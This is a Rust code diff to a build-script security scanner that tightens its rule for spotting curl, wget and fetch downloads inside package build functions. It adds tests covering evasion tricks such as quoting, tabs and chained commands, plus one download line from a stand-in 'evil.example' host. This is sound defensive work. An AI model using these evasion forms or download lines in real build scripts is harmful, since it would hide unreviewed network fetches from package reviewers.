@@ -3,6 +3,7 @@
 use super::SecurityAnalyzer;
 use crate::error::Result;
 use crate::rules::RuleEngine;
+use crate::textutil::{logical_lines, normalize_shell_quoting};
 use crate::types::{AnalysisContext, Category, FileType, Finding, Location, Severity};
 use async_trait::async_trait;
 use std::sync::Arc;
@@ -125,47 +126,72 @@ impl PatternAnalyzer {
                 ("fetch", "Network access in build function"),
             ];
 
-            // Match case-insensitively so a `CURL`/`Wget` case variant cannot
-            // evade FUNC-001 (audit HI-6). The patterns are lowercase command
-            // names, so lower-casing the body once is sufficient and correct.
-            let body_lc = func_body.content.to_lowercase();
+            // Matched per logical line, so a comment silences only itself. The
+            // old whole-body test skipped the function if `# curl` appeared
+            // ANYWHERE in it, so one comment line hid a real `curl` on the next.
+            // Each line is de-quoted the way the shell reads it (`"curl" url` is
+            // `curl url`) and lower-cased so `CURL` cannot evade (audit HI-6).
+            let lines: Vec<String> = logical_lines(&func_body.content)
+                .into_iter()
+                .filter(|(_, line)| !line.trim_start().starts_with('#'))
+                .map(|(_, line)| normalize_shell_quoting(&line).to_lowercase())
+                .collect();
             for (pattern, message) in &network_patterns {
-                if body_lc.contains(pattern) && !body_lc.contains(&format!("# {}", pattern)) {
-                    // Check if it's actually a download command (not a variable)
-                    if body_lc.contains(&format!("{} ", pattern))
-                        || body_lc.contains(&format!("${}", pattern))
-                    {
-                        findings.push(Finding {
-                            id: "FUNC-001".to_string(),
-                            severity: Severity::High,
-                            category: Category::NetworkSecurity,
-                            title: message.to_string(),
-                            description: format!(
-                                "Function '{}' contains network access command '{}'",
-                                func_name, pattern
-                            ),
-                            location: Location {
-                                file: context.file_path.clone(),
-                                line: Some(func_body.line_start),
-                                column: None,
-                                snippet: None,
-                            },
-                            recommendation:
-                                "Network access should happen in source= array, not build functions"
-                                    .to_string(),
-                            cwe_id: None,
-                            metadata: serde_json::json!({
-                                "function": func_name,
-                                "pattern": pattern,
-                            }),
-                        });
-                    }
+                if lines.iter().any(|line| invokes_command(line, pattern)) {
+                    findings.push(Finding {
+                        id: "FUNC-001".to_string(),
+                        severity: Severity::High,
+                        category: Category::NetworkSecurity,
+                        title: message.to_string(),
+                        description: format!(
+                            "Function '{}' contains network access command '{}'",
+                            func_name, pattern
+                        ),
+                        location: Location {
+                            file: context.file_path.clone(),
+                            line: Some(func_body.line_start),
+                            column: None,
+                            snippet: None,
+                        },
+                        recommendation:
+                            "Network access should happen in source= array, not build functions"
+                                .to_string(),
+                        cwe_id: None,
+                        metadata: serde_json::json!({
+                            "function": func_name,
+                            "pattern": pattern,
+                        }),
+                    });
                 }
             }
         }
 
         Ok(findings)
     }
+}
+
+/// Whether a de-quoted, lower-cased shell line runs `cmd` or expands a `$cmd` /
+/// `${cmd}` variable.
+///
+/// The command name needs a word boundary on the left, so `libcurl`,
+/// `prefetch` and `my_wget` are build-target names, not downloads (#35). A `/`
+/// or `\` is a boundary, so `/usr/bin/curl` and `\curl` still count. It must be
+/// followed by whitespace (space OR tab), as a command with arguments is.
+fn invokes_command(line: &str, cmd: &str) -> bool {
+    if line.contains(&format!("${cmd}")) || line.contains(&format!("${{{cmd}")) {
+        return true;
+    }
+    line.match_indices(cmd).any(|(start, _)| {
+        let bounded_left = line[..start]
+            .chars()
+            .next_back()
+            .is_none_or(|c| !(c.is_alphanumeric() || matches!(c, '_' | '-' | '.')));
+        let has_args = line[start + cmd.len()..]
+            .chars()
+            .next()
+            .is_some_and(char::is_whitespace);
+        bounded_left && has_args
+    })
 }
 
 #[cfg(test)]
@@ -225,6 +251,84 @@ build() {
             findings.iter().any(|f| f.id == "FUNC-001"),
             "uppercase CURL in build() must still raise FUNC-001: {findings:?}"
         );
+    }
+
+    async fn func001_ids(build_body: &str) -> bool {
+        let analyzer = PatternAnalyzer::new(Arc::new(RuleEngine::default()));
+        let context = create_test_context(&format!(
+            "pkgname=test\npkgver=1\npkgrel=1\nbuild() {{\n{build_body}\n}}\n"
+        ));
+        let findings = analyzer.analyze(&context).await.unwrap();
+        findings.iter().any(|f| f.id == "FUNC-001")
+    }
+
+    #[tokio::test]
+    async fn func001_build_target_names_are_not_downloads() {
+        // Reported in #35: building a target whose name ENDS in a command name
+        // (`libcurl`, `prefetch`) is not network access.
+        for target in [
+            "libcurl", "libwget", "prefetch", "my_curl", "my-wget", "my.fetch",
+        ] {
+            assert!(
+                !func001_ids(&format!(
+                    "    cmake --build build --target {target} --parallel"
+                ))
+                .await,
+                "building {target} is not network access"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn func001_download_commands_still_flag() {
+        for line in [
+            "curl https://example.com/src.tar.gz",
+            "wget https://example.com/src.tar.gz",
+            "fetch https://example.com/src.tar.gz",
+            "/usr/bin/curl https://example.com/src.tar.gz",
+            "./wget https://example.com/src.tar.gz",
+            "\\curl https://example.com/src.tar.gz",
+            "true;curl https://example.com/src.tar.gz",
+            "make && wget https://example.com/src.tar.gz",
+            "x=$(curl -s https://example.com/v)",
+            "$curl https://example.com/src.tar.gz",
+            "${wget} https://example.com/src.tar.gz",
+            "cmake --build build --target libcurl; curl https://example.com/x",
+        ] {
+            assert!(
+                func001_ids(&format!("    {line}")).await,
+                "{line:?} must flag"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn func001_a_comment_only_silences_itself() {
+        // The old check skipped the WHOLE function when `# curl` appeared
+        // anywhere in it, so one comment line hid a real download.
+        assert!(
+            func001_ids("    # curl is only needed for the -git variant\n    curl https://evil.example/x -o y")
+                .await,
+            "a `# curl` comment must not hide a real curl on another line"
+        );
+        assert!(
+            !func001_ids("    # curl https://example.com is mirrored in source=()").await,
+            "a comment on its own is not network access"
+        );
+    }
+
+    #[tokio::test]
+    async fn func001_whitespace_and_quoting_cannot_hide_the_command() {
+        for line in [
+            "curl\thttps://example.com/x -o y",
+            "\"curl\" https://example.com/x -o y",
+            "'w'get https://example.com/x",
+        ] {
+            assert!(
+                func001_ids(&format!("    {line}")).await,
+                "{line:?} must flag"
+            );
+        }
     }
 
     #[tokio::test]
